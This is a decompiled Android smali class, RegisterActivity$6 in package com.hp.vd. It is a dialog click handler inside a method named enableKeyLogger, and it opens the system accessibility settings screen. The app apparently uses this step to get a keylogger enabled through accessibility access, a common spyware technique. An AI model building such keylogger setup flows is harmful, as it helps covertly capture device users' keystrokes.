.class Lcom/hp/vd/RegisterActivity$6;
.super Ljava/lang/Object;
.source "RegisterActivity.java"

# interfaces
.implements Landroid/content/DialogInterface$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/hp/vd/RegisterActivity;->enableKeyLogger(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/hp/vd/RegisterActivity;


# direct methods
.method constructor <init>(Lcom/hp/vd/RegisterActivity;)V
    .locals 0

    .line 680
    iput-object p1, p0, Lcom/hp/vd/RegisterActivity$6;->this$0:Lcom/hp/vd/RegisterActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/content/DialogInterface;I)V
    .locals 1

    .line 682
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity$6;->this$0:Lcom/hp/vd/RegisterActivity;

    new-instance p2, Landroid/content/Intent;

    const-string v0, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {p2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/16 v0, 0x309

    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/RegisterActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method
